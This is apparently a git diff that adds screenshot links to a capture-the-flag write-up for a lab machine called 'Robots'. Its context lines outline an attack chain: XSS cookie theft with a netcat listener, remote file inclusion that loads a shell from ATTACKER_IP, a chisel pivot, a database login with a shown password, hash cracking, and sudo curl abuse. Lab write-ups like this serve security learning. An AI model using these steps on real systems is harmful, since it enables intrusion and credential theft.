@@ -35,6 +35,8 @@
 
 ## 2. Initial Reconnaissance
 
+![Landing Page](images/Robots/img1.jpg)
+
 The first step in any penetration test is reconnaissance. I ran an **Nmap** scan to discover open ports and services:
 
 ```bash
@@ -60,6 +62,8 @@ Visit **`/harm/to/self`**. There are **login** and **registration** endpoints.
 ---
 
 ## 3. Registration & Login
+
+![Landing Page](images/Robots/img2.jpg)
 
 From reviewing the the information given on the registration page, its pretty easy to generate our password:
 
@@ -95,6 +99,8 @@ After confirming callbacks, we will weaponize XSS to **exfiltrate** `server_info
 
 ## 5. Exploiting XSS for Cookie Theft
 
+![Landing Page](images/Robots/img5.jpg)
+
 Next, I created a script `xss.js` to exfiltrate cookies:
 
 ```javascript
@@ -129,12 +135,15 @@ Finally, I listened on my box:
 ```bash
 nc -lvnp 88
 ```
+![Landing Page](images/Robots/img6.jpg)
 
 This gave me base64-encoded data containing cookies. After decoding with CyberChef, I retrieved a valid **admin session cookie**, & by appending the stolen cookie into my browser session, I accessed `http://robots.thm/admin.php`.
 
 ---
 
 ## 6. RFI on `admin.php` → Reverse Shell (www-data in container)
+
+![Landing Page](images/Robots/img7.jpg)
 
 The `admin.php` page exposes a single **URL input**. Which is **RFI**-vulnerable. To test, we will use a benign URL to your server:
 
@@ -170,6 +179,8 @@ http://ATTACKER_IP:8000/shell.php
 
 ## 7. Container Enumeration → DB Pivot
 
+![Landing Page](images/Robots/img8.jpg)
+
 Container mounts and “db” host discovery:
 
 ```bash
@@ -191,6 +202,8 @@ No `mysql` client installed in the container, so we used **chisel** for a revers
 
 ### Chisel Pivot
 
+![Landing Page](images/Robots/img9.jpg)
+
 **Attacker (your box):**
 ```bash
 chisel server -p 8000 --reverse
@@ -208,6 +221,7 @@ chisel server -p 8000 --reverse
 mysql -h 127.0.0.1 -P 3307 -u robots -p
 # password: q4qCz1OflKvKwK4S
 ```
+![Landing Page](images/Robots/img10.jpg)
 
 Dump the `web` database and `users` table, e.g.:
 ```sql
@@ -216,7 +230,7 @@ USE web;
 SHOW TABLES;
 SELECT id,username,password,`group` FROM users;
 ```
-
+![Landing Page](images/Robots/img11.jpg)
 Sample entries observed:
 ```
 MariaDB [web]> SELECT * FROM users;
@@ -245,6 +259,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 rgiskard.hash
 ---
 
 ## 8. SSH as `rgiskard` → Abuse Sudo curl Rule (to become `dolivaw`)
+
+![Landing Page](images/Robots/img12.jpg)
 
 SSH in:
 
@@ -340,6 +356,8 @@ whoami
 ```
 
 Grab the **root flag (Flag #2)**:
+
+![Landing Page](images/Robots/img13.jpg)
 
 ```bash
 cat /root/root.txt
